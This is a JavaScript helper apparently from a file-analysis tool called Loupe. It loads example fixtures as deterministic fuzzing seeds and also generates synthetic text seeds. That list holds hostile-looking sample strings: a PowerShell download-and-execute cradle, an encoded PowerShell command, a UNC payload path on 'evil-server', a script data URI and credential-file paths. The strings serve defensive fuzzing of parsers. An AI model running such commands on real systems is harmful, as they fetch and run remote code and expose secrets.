'use strict';
// ════════════════════════════════════════════════════════════════════════════
// seed-corpus.js — deterministic seed walker for Loupe's example corpus.
//
// Loupe ships ~150 example fixtures under `examples/<format>/`. Each fuzz
// target wants a small set of seeds matching its format. This helper:
//
//   • walks one or more `examples/<format>/` directories in sorted order
//     (matches the os.walk(sorted) discipline in scripts/run_tests_e2e.py
//     and scripts/build.py)
//   • applies an optional file-extension filter
//   • caps total seed bytes at 4 MiB (per-seed cap configurable) to keep
//     the replay-mode mutator bounded
//   • returns a deterministic Buffer[] — the same checkout produces the
//     same array (modulo .gitignored / new files)
//
// The walker is also used by `scripts/run_fuzz.py` to pre-stage
// `dist/fuzz-corpus/<target>/seeds/` for Jazzer.js. Jazzer.js then takes
// over and grows its own coverage-guided corpus alongside.
// ════════════════════════════════════════════════════════════════════════════

const fs = require('node:fs');
const path = require('node:path');

const REPO_ROOT = path.resolve(__dirname, '..', '..', '..');
const EXAMPLES_DIR = path.join(REPO_ROOT, 'examples');

/**
 * Recursively enumerate files under `dir`, deterministically.
 *
 * @param {string} dir absolute directory
 * @returns {string[]} sorted absolute file paths
 */
function walkSorted(dir) {
  const out = [];
  const stack = [dir];
  while (stack.length) {
    const cur = stack.pop();
    let entries;
    try { entries = fs.readdirSync(cur, { withFileTypes: true }); }
    catch (_) { continue; }
    entries.sort((a, b) => a.name.localeCompare(b.name));
    for (const ent of entries) {
      const p = path.join(cur, ent.name);
      if (ent.isDirectory()) stack.push(p);
      else if (ent.isFile()) out.push(p);
    }
  }
  out.sort();
  return out;
}

/**
 * @param {object} cfg
 * @param {string[]}  cfg.dirs   `examples/`-relative dir names (e.g. `['pe', 'elf']`)
 *                               OR absolute paths.
 * @param {string[]} [cfg.extensions] case-insensitive extensions (no dot, e.g. `['exe','dll']`)
 * @param {number}   [cfg.perFileMaxBytes=1048576]  cap per seed (1 MiB)
 * @param {number}   [cfg.totalMaxBytes=4194304]    cap total (4 MiB)
 * @param {number}   [cfg.maxSeeds=64]              cap seed count
 * @returns {Buffer[]}
 */
function loadSeeds(cfg) {
  const c = cfg || {};
  const dirs = Array.isArray(c.dirs) ? c.dirs : [];
  const exts = Array.isArray(c.extensions)
    ? c.extensions.map(e => '.' + String(e).toLowerCase().replace(/^\./, ''))
    : null;
  const perFileMax = (typeof c.perFileMaxBytes === 'number' && c.perFileMaxBytes > 0)
    ? c.perFileMaxBytes : 1024 * 1024;
  const totalMax = (typeof c.totalMaxBytes === 'number' && c.totalMaxBytes > 0)
    ? c.totalMaxBytes : 4 * 1024 * 1024;
  const maxSeeds = (typeof c.maxSeeds === 'number' && c.maxSeeds > 0)
    ? c.maxSeeds : 64;

  const seeds = [];
  let total = 0;

  for (const d of dirs) {
    const abs = path.isAbsolute(d) ? d : path.join(EXAMPLES_DIR, d);
    if (!fs.existsSync(abs) || !fs.statSync(abs).isDirectory()) continue;
    for (const file of walkSorted(abs)) {
      if (seeds.length >= maxSeeds) break;
      if (exts && !exts.includes(path.extname(file).toLowerCase())) continue;
      let buf;
      try { buf = fs.readFileSync(file); }
      catch (_) { continue; }
      if (buf.length > perFileMax) buf = buf.subarray(0, perFileMax);
      if (total + buf.length > totalMax) break;
      total += buf.length;
      seeds.push(buf);
    }
    if (seeds.length >= maxSeeds) break;
  }

  return seeds;
}

/**
 * Synthesise a "structureless" seed corpus when there are no example
 * fixtures (e.g. for the regex-shape fuzz targets where any text works).
 * Deterministic; never returns more than `count` seeds.
 */
function syntheticTextSeeds(count) {
  const n = (typeof count === 'number' && count > 0) ? count : 8;
  const out = [];
  const samples = [
    'https://example.com/path?q=1',
    'C:\\Windows\\System32\\cmd.exe /c whoami',
    '\\\\evil-server\\share\\payload.exe',
    'powershell -enc SQBFAFgAIAAoAA==',
    'invoke-expression(new-object net.webclient).downloadstring(\'http://x\')',
    '8.8.8.8 1.1.1.1 ::1 fe80::1%eth0',
    'mailto:victim@example.com?subject=hi',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '0x1A2B3C4D 0xDEADBEEF 0xCAFEBABE',
    '/etc/passwd /proc/self/environ /tmp/.X11-unix',
  ];
  for (let i = 0; i < n; i++) {
    out.push(Buffer.from(samples[i % samples.length], 'utf8'));
  }
  return out;
}

module.exports = { loadSeeds, walkSorted, syntheticTextSeeds, EXAMPLES_DIR };
